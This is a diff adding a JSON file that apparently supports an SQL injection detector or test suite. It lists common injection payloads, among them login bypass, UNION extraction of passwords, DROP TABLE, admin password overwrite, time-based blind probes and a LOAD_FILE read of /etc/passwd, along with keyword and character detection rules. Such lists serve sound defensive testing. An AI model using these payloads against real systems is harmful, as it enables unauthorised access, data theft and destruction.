@@ -1,0 +1,40 @@
+{
+  "common_payloads": [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "' OR 1=1 --",
+    "admin' --",
+    "admin' #",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT username,password FROM users--",
+    "1' AND 1=1--",
+    "1' AND 1=2--",
+    "' OR 'x'='x",
+    "' OR 1=1 OR 'x'='y",
+    "') OR ('1'='1",
+    "'; DROP TABLE users; --",
+    "1; UPDATE users SET password='hacked' WHERE username='admin'",
+    "' UNION SELECT 1,@@version,3--",
+    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+    "1' AND SLEEP(5)--",
+    "' OR SLEEP(5)--",
+    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
+    "admin' AND 1=1--",
+    "' UNION SELECT LOAD_FILE('/etc/passwd')--"
+  ],
+  "detection_rules": {
+    "keywords": [
+      "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", 
+      "ALTER", "CREATE", "EXEC", "EXECUTE", "WAITFOR", "SLEEP",
+      "BENCHMARK", "INFORMATION_SCHEMA"
+    ],
+    "characters": ["'", "\"", ";", "--", "#", "/*", "*/", "||", "&&"],
+    "functions": [
+      "SLEEP()", "BENCHMARK()", "EXTRACTVALUE()", "UPDATEXML()",
+      "CONCAT()", "GROUP_CONCAT()", "LOAD_FILE()", "INTO OUTFILE"
+    ]
+  }
+}
